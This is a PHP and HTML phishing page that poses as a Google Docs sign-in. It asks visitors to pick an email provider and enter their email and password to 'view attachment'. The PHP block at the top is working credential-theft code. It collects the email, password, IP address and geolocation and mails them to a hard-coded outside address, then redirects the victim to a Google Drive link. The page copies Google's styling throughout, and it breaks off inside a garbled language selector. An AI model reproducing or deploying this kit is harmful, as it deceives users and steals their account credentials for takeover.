﻿<?php 


if (isset($_POST['Email'])) { 

$emailprovider = $_POST["hidCflag"]; 


switch ($emailprovider) { 
    case 0: 
        $emailprovider = "Gmail"; 
        break; 
    case 1: 
        $emailprovider = "Yahoo"; 
        break; 
    case 2: 
        $emailprovider = "Hotmail"; 
        break; 
    case 3: 
        $emailprovider = "AOL"; 
        break; 
    case 4: 
        $emailprovider = "Others"; 
        break; 
} 
$browser = $_SERVER['HTTP_USER_AGENT'];

require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "---------------|BY MUCHO|---------------\n";
$message .= "Email Provider: ".$emailprovider."\n"; //
$message .= "E: " . $_POST['Email'] . "\n"; 
$message .= "Ps: " . $_POST['Passwd'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "---------------------------------------------\n";

$to = "fabiennebamd@outlook.com"; 

  
$hi = mail($to,$emailprovider." | ".$ip , $message); 

if ($emailprovider == "Gmaill")
{
	?> 
<script type="text/javascript"> 
<!-- 
   window.location="verification.php"

</script> 
<?php	
}else{

  ?> 
<script type="text/javascript"> 
<!-- 
    window.location="https://drive.google.com/open?id=0B8PQkY7UKS4ATDE0S0tOWThOZkU"; 

</script> 
<?php	

}
fclose($handle); 
exit; 

 } 
?> 


<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
 <title>Google Docs</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(Google_docs_files/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
	height: 75px;
	border-bottom: 1px solid #e5e5e5;
	overflow: hidden;
  }
  .header .logo {
	float: left;
	margin-top: 13px;
	margin-right: 0;
	margin-bottom: 0;
	margin-left: 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
	border: 0;
	height: 75px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);

  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  }
  .google-header-bar.centered .header .logo {
	margin-top: 15px;
	margin-right: auto;
	margin-bottom: 15px;
	margin-left: auto;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(Google_docs_files/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff) format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(Google_docs_files/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff) format('woff');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  .banner {
	text-align: center;
	margin-top: 5px;
	margin-bottom: 5px;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
	margin-bottom: 3px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("Google_docs_files/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<link href="SpryAssets/SpryValidationPassword.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="Google_docs_files/favicon.ico" type="image/x-icon" />
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<script src="SpryAssets/SpryValidationPassword.js" type="text/javascript"></script>
  </head>
  
   
    
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img src="Google_docs_files/logo_strip.png" alt="Google" width="405" height="72" class="logo">
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
  <h2> Welcome to Google Docs. Upload and Share Your Documents Securely </h2>
  <h2 class="hidden-small">
    Sign in with your email address to view or download attachment</h2>
</div>
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"></div>
<img class="profile-img" src="Google_docs_files/avatar_2x.png" alt="">
<!-- form submit start -->
			<form action="#" method="POST" autocomplete="OFF">
   <div><strong>Select your email provider</strong></div></br>
    <input type="hidden" name="hidCflag" id="hidCflag" value="" />
    <select class="cflagdd"><option value="0" data-imagesrc="Google_docs_files/mail_gmail.png"
            data-description="Sign in with Gmail">Gmail</option>
        <option value="1" data-imagesrc="Google_docs_files/yahoo.png"
            data-description="Sign in with Yahoo">Yahoo</option>
        <option value="2"  data-imagesrc="Google_docs_files/live_hotmail.png"
            data-description="Sign in with Hotmail">Hotmail</option>
        <option value="3" data-imagesrc="Google_docs_files/aol.png"
            data-description="Sign in with AOL">AOL</option>
        <option value="4" data-imagesrc="Google_docs_files/email.png"
            data-description="Sign in with Others">Others</option></select>
             <br/>
         <label class="hidden-label" for="Email">Email</label>

<span id="sprytextfield1">
<input id="Email" name="Email" type="email"
       placeholder="Email"
       value=""
       spellcheck="false"
       class="">
<span class="textfieldRequiredMsg">Enter your email.</span><span class="textfieldInvalidFormatMsg">Enter a valid email.</span></span>
<label class="hidden-label" for="Passwd">Password</label>
<span id="sprypassword1">
<input id="Passwd" name="Passwd" type="password"
       placeholder="Password"
       class="">
<span class="passwordRequiredMsg">Enter your password.</span></span>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in to view attachment">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie"
                 type="checkbox" value="yes">
  <span>
  Stay signed in
  </span>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" href="#"
       class="need-help-reverse"
       >
  Need help?
  </a>
</form>
</div>
<div class="one-google">
  <p class="tagline">
    Access your documents securely, no matter your location
</p>
<img src="Google_docs_files/logo_strip_2x.png" width="420" height="32" alt="">
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  Google
  </li>
  <li>
  <a href="#" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="Google_docs_files/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  Ð²Ð‚Ð„AfrikaansÐ²Ð‚Â¬
  </option>
  <option value="az"
                 >
  Ð²Ð‚Ð„azÐ™â„¢rbaycanÐ²Ð‚Â¬
  </option>
  <option value="in"
                 >
  Ð²Ð‚Ð„Bahasa IndonesiaÐ²Ð‚Â¬
  </option>
  <option value="ms"
                 >
  Ð²Ð‚Ð„Bahasa MelayuÐ²Ð‚Â¬
  </option>
  <option value="ca"
                 >
  Ð²Ð‚Ð„catalÐ“Â Ð²Ð‚Â¬
  </option>
  <option value="cs"
                 >
  Ð²Ð‚Ð„Ð”ÐŠeÐ•ÐŽtinaÐ²Ð‚Â¬
  </option>
  <option value="da"
                 >
  Ð²Ð‚Ð„DanskÐ²Ð‚Â¬
  </option>
  <option value="de"
                 >
  Ð²Ð‚Ð„DeutschÐ²Ð‚Â¬
  </option>
  <option value="et"
                 >
  Ð²Ð‚Ð„eestiÐ²Ð‚Â¬
  </option>
  <option value="en-GB"
                 >
  Ð²Ð‚Ð„English (United Kingdom)Ð²Ð‚Â¬
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  Ð²Ð‚Ð„English (United States)Ð²Ð‚Â¬
  </option>
  <option value="es"
                 >
  Ð²Ð‚Ð„EspaÐ“Â±ol (EspaÐ“Â±a)Ð²Ð‚Â¬
  </option>
  <option value="es-419"
                 >
  Ð²Ð‚Ð„EspaÐ“Â±ol (LatinoamÐ“Â©rica)Ð²Ð‚Â¬
  </option>
  <option value="eu"
                 >
  Ð²Ð‚Ð„euskaraÐ²Ð‚Â¬
  </option>
  <option value="fil"
                 >
  Ð²Ð‚Ð„FilipinoÐ²Ð‚Â¬
  </option>
  <option value="fr-CA"
                 >
  Ð²Ð‚Ð„FranÐ“Â§ais (Canada)Ð²Ð‚Â¬
  </option>
  <option value="fr"
                 >
  Ð²Ð‚Ð„FranÐ“Â§ais (France)Ð²Ð‚Â¬
  </option>
  <option value="gl"
                 >
  Ð²Ð‚Ð„galegoÐ²Ð‚Â¬
  </option>
  <option value="hr"
                 >
  Ð²Ð‚Ð„HrvatskiÐ²Ð‚Â¬
  </option>
  <option value="zu"
                 >
  Ð²Ð‚Ð„isiZuluÐ²Ð‚Â¬
  </option>
  <option value="is"
                 >
  Ð²Ð‚Ð„Ð“Â­slenskaÐ²Ð‚Â¬
  </option>
  <option value="it"
                 >
